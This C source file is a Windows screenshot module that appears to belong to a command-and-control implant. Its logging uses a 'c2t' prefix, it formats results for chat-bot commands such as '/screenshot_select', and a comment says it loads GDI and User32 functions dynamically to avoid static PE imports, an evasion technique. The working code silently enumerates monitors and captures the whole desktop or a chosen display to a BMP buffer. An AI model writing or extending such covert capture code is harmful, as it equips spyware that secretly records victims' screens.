/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifdef _WIN32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "screenshot.h"
#include "../logging/logging.h"
#include "../win32/win32_api.h"

#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_WIN_DISPLAYS 16

typedef struct {
  int id;
  RECT rect;
  int is_primary;
  char name[64];
} win_display_info_t;

static win_display_info_t win_displays[MAX_WIN_DISPLAYS];
static int win_display_count = 0;
static char selected_display_target[64] = "all";
static int selected_display_index = -1;

/* Dynamic function pointers to avoid static PE imports on gdi32.dll */
typedef HDC(WINAPI *pfn_GetDC)(HWND);
typedef int(WINAPI *pfn_ReleaseDC)(HWND, HDC);
typedef int(WINAPI *pfn_GetSystemMetrics)(int);
typedef BOOL(WINAPI *pfn_EnumDisplayMonitors)(HDC, LPCRECT, MONITORENUMPROC, LPARAM);
typedef BOOL(WINAPI *pfn_GetMonitorInfoA)(HMONITOR, LPMONITORINFO);

typedef HDC(WINAPI *pfn_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI *pfn_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI *pfn_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI *pfn_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int(WINAPI *pfn_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL(WINAPI *pfn_DeleteObject)(HGDIOBJ);
typedef BOOL(WINAPI *pfn_DeleteDC)(HDC);

static struct {
  pfn_CreateCompatibleDC CreateCompatibleDC;
  pfn_CreateCompatibleBitmap CreateCompatibleBitmap;
  pfn_SelectObject SelectObject;
  pfn_BitBlt BitBlt;
  pfn_GetDIBits GetDIBits;
  pfn_DeleteObject DeleteObject;
  pfn_DeleteDC DeleteDC;
  pfn_GetDC GetDC;
  pfn_ReleaseDC ReleaseDC;
  pfn_GetSystemMetrics GetSystemMetrics;
  pfn_EnumDisplayMonitors EnumDisplayMonitors;
  pfn_GetMonitorInfoA GetMonitorInfoA;
  int initialized;
} g_gdi = {0};

static void init_gdi_api(void) {
  if (g_gdi.initialized) return;

  HMODULE hUser32 = GetModuleHandleA("user32.dll");
  if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
  if (hUser32) {
    g_gdi.GetDC = (pfn_GetDC)GetProcAddress(hUser32, "GetDC");
    g_gdi.ReleaseDC = (pfn_ReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
    g_gdi.GetSystemMetrics = (pfn_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
    g_gdi.EnumDisplayMonitors = (pfn_EnumDisplayMonitors)GetProcAddress(hUser32, "EnumDisplayMonitors");
    g_gdi.GetMonitorInfoA = (pfn_GetMonitorInfoA)GetProcAddress(hUser32, "GetMonitorInfoA");
  }

  HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
  if (!hGdi32) hGdi32 = LoadLibraryA("gdi32.dll");
  if (hGdi32) {
    g_gdi.CreateCompatibleDC = (pfn_CreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
    g_gdi.CreateCompatibleBitmap = (pfn_CreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    g_gdi.SelectObject = (pfn_SelectObject)GetProcAddress(hGdi32, "SelectObject");
    g_gdi.BitBlt = (pfn_BitBlt)GetProcAddress(hGdi32, "BitBlt");
    g_gdi.GetDIBits = (pfn_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
    g_gdi.DeleteObject = (pfn_DeleteObject)GetProcAddress(hGdi32, "DeleteObject");
    g_gdi.DeleteDC = (pfn_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
  }
  g_gdi.initialized = 1;
}

static BOOL CALLBACK MonitorEnumProc(HMONITOR hMon, HDC hdcMon, LPRECT lprcMon, LPARAM dwData) {
  (void)hdcMon;
  (void)dwData;
  if (win_display_count >= MAX_WIN_DISPLAYS) return FALSE;

  MONITORINFOEX mi;
  ZeroMemory(&mi, sizeof(mi));
  mi.cbSize = sizeof(mi);

  if (g_gdi.GetMonitorInfoA && g_gdi.GetMonitorInfoA(hMon, (LPMONITORINFO)&mi)) {
    win_displays[win_display_count].id = win_display_count;
    win_displays[win_display_count].rect = mi.rcMonitor;
    win_displays[win_display_count].is_primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    snprintf(win_displays[win_display_count].name,
             sizeof(win_displays[win_display_count].name),
             "Display %d (%s)", win_display_count, mi.szDevice);
    win_display_count++;
  }
  return TRUE;
}

static void refresh_windows_displays(void) {
  init_gdi_api();
  win_display_count = 0;
  if (g_gdi.EnumDisplayMonitors) {
    g_gdi.EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
  }
}

int screenshot_capture_windows_display(const char *target,
                                      void **out_data, size_t *out_size,
                                      const char **out_mime_type,
                                      const char **out_filename) {
  if (!out_data || !out_size || !out_mime_type || !out_filename) {
    return 0;
  }
  *out_data = NULL;
  *out_size = 0;

  init_gdi_api();
  if (!g_gdi.GetDC || !g_gdi.ReleaseDC || !g_gdi.CreateCompatibleDC ||
      !g_gdi.CreateCompatibleBitmap || !g_gdi.SelectObject ||
      !g_gdi.BitBlt || !g_gdi.GetDIBits || !g_gdi.DeleteObject || !g_gdi.DeleteDC) {
    c2t_log_warning("screenshot", "Required GDI/User32 dynamic procedures unavailable");
    return 0;
  }

  refresh_windows_displays();

  int target_idx = -1;
  if (target && *target && strcmp(target, "all") != 0 && strcmp(target, "*") != 0) {
    target_idx = atoi(target);
  }

  int x, y, width, height;

  if (target_idx >= 0 && target_idx < win_display_count) {
    x = win_displays[target_idx].rect.left;
    y = win_displays[target_idx].rect.top;
    width = win_displays[target_idx].rect.right - win_displays[target_idx].rect.left;
    height = win_displays[target_idx].rect.bottom - win_displays[target_idx].rect.top;
  } else if (g_gdi.GetSystemMetrics) {
    x = g_gdi.GetSystemMetrics(SM_XVIRTUALSCREEN);
    y = g_gdi.GetSystemMetrics(SM_YVIRTUALSCREEN);
    width = g_gdi.GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = g_gdi.GetSystemMetrics(SM_CYVIRTUALSCREEN);
  } else {
    x = 0;
    y = 0;
    width = 1920;
    height = 1080;
  }

  if ((width <= 0 || height <= 0) && g_gdi.GetSystemMetrics) {
    width = g_gdi.GetSystemMetrics(SM_CXSCREEN);
    height = g_gdi.GetSystemMetrics(SM_CYSCREEN);
    x = 0;
    y = 0;
  }

  if (width <= 0 || height <= 0) {
    c2t_log_warning("screenshot", "Invalid Windows screen dimensions (%dx%d)", width, height);
    return 0;
  }

  HDC screen = g_gdi.GetDC(NULL);
  if (!screen) {
    c2t_log_warning("screenshot", "GetDC failed");
    return 0;
  }

  HDC memory = g_gdi.CreateCompatibleDC(screen);
  HBITMAP bitmap = g_gdi.CreateCompatibleBitmap(screen, width, height);
  if (!memory || !bitmap) {
    c2t_log_warning("screenshot", "GDI DC or bitmap creation failed");
    if (bitmap) g_gdi.DeleteObject(bitmap);
    if (memory) g_gdi.DeleteDC(memory);
    g_gdi.ReleaseDC(NULL, screen);
    return 0;
  }

  HGDIOBJ prev = g_gdi.SelectObject(memory, bitmap);
  if (!g_gdi.BitBlt(memory, 0, 0, width, height, screen, x, y, SRCCOPY | CAPTUREBLT)) {
    c2t_log_warning("screenshot", "BitBlt failed");
    g_gdi.SelectObject(memory, prev);
    g_gdi.DeleteObject(bitmap);
    g_gdi.DeleteDC(memory);
    g_gdi.ReleaseDC(NULL, screen);
    return 0;
  }

  BITMAPINFO bmi;
  ZeroMemory(&bmi, sizeof(bmi));
  bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  bmi.bmiHeader.biWidth = width;
  bmi.bmiHeader.biHeight = -height; /* Top-down BMP */
  bmi.bmiHeader.biPlanes = 1;
  bmi.bmiHeader.biBitCount = 32;
  bmi.bmiHeader.biCompression = BI_RGB;

  size_t image_size = (size_t)width * (size_t)height * 4U;
  size_t header_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
  size_t total_size = header_size + image_size;

  unsigned char *bmp_buf = (unsigned char *)malloc(total_size);
  if (!bmp_buf) {
    c2t_log_error("screenshot", "Out of memory allocating screenshot buffer (%zu bytes)", total_size);
    g_gdi.SelectObject(memory, prev);
    g_gdi.DeleteObject(bitmap);
    g_gdi.DeleteDC(memory);
    g_gdi.ReleaseDC(NULL, screen);
    return 0;
  }

  BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)bmp_buf;
  bfh->bfType = 0x4D42; /* 'BM' */
  bfh->bfSize = (DWORD)total_size;
  bfh->bfReserved1 = 0;
  bfh->bfReserved2 = 0;
  bfh->bfOffBits = (DWORD)header_size;

  BITMAPINFOHEADER *bih = (BITMAPINFOHEADER *)(bmp_buf + sizeof(BITMAPFILEHEADER));
  *bih = bmi.bmiHeader;
  bih->biSizeImage = (DWORD)image_size;

  unsigned char *pixels = bmp_buf + header_size;
  if (!g_gdi.GetDIBits(memory, bitmap, 0, (UINT)height, pixels, &bmi, DIB_RGB_COLORS)) {
    c2t_log_warning("screenshot", "GetDIBits failed");
    free(bmp_buf);
    g_gdi.SelectObject(memory, prev);
    g_gdi.DeleteObject(bitmap);
    g_gdi.DeleteDC(memory);
    g_gdi.ReleaseDC(NULL, screen);
    return 0;
  }

  g_gdi.SelectObject(memory, prev);
  g_gdi.DeleteObject(bitmap);
  g_gdi.DeleteDC(memory);
  g_gdi.ReleaseDC(NULL, screen);

  *out_data = bmp_buf;
  *out_size = total_size;
  *out_mime_type = "image/bmp";
  *out_filename = "screenshot.bmp";
  c2t_log_info("screenshot", "Captured %dx%d Windows desktop screenshot (%zu bytes BMP)", width, height, total_size);
  return 1;
}

int screenshot_capture_windows(void **out_data, size_t *out_size,
                               const char **out_mime_type,
                               const char **out_filename) {
  return screenshot_capture_display("all", out_data, out_size, out_mime_type, out_filename);
}

int screenshot_get_display_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return 0;
  refresh_windows_displays();

  if (win_display_count == 0) {
    snprintf(buffer, max_len,
             "🖥️ <b>Connected Displays (Windows):</b>\n\n"
             "• <b>[all]</b> <i>Virtual Desktop / Primary Screen</i> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
    return 1;
  }

  size_t offset = (size_t)snprintf(
      buffer, max_len, "🖥️ <b>Detected Displays (%d):</b>\n\n", win_display_count);

  for (int i = 0; i < win_display_count && offset + 128 < max_len; ++i) {
    int w = win_displays[i].rect.right - win_displays[i].rect.left;
    int h = win_displays[i].rect.bottom - win_displays[i].rect.top;
    int active = (selected_display_index == i) || (selected_display_index == -1);

    offset += (size_t)snprintf(
        buffer + offset, max_len - offset,
        "• <b>[%d]</b> <code>%s</code> (%dx%d)%s\n"
        "  Status: %s\n",
        win_displays[i].id, win_displays[i].name, w, h,
        win_displays[i].is_primary ? " 🌟 <i>Primary</i>" : "",
        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
  }

  if (offset + 128 < max_len) {
    snprintf(buffer + offset, max_len - offset,
             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
  }
  return 1;
}

int screenshot_select_display(const char *target) {
  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
    selected_display_index = -1;
    snprintf(selected_display_target, sizeof(selected_display_target), "all");
  } else {
    int is_num = 1;
    for (const char *p = target; *p; ++p) {
      if (!isdigit((unsigned char)*p)) {
        is_num = 0;
        break;
      }
    }
    if (is_num) {
      selected_display_index = atoi(target);
      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
    } else {
      selected_display_index = -1;
      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
    }
  }
  c2t_log_info("screenshot", "Selected Windows display target '%s'", selected_display_target);
  return 1;
}

void screenshot_get_selected_display(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;
  snprintf(buffer, max_len, "%s", selected_display_target);
}

int screenshot_get_display_count(void) {
  refresh_windows_displays();
  return win_display_count > 0 ? win_display_count : 1;
}

#endif
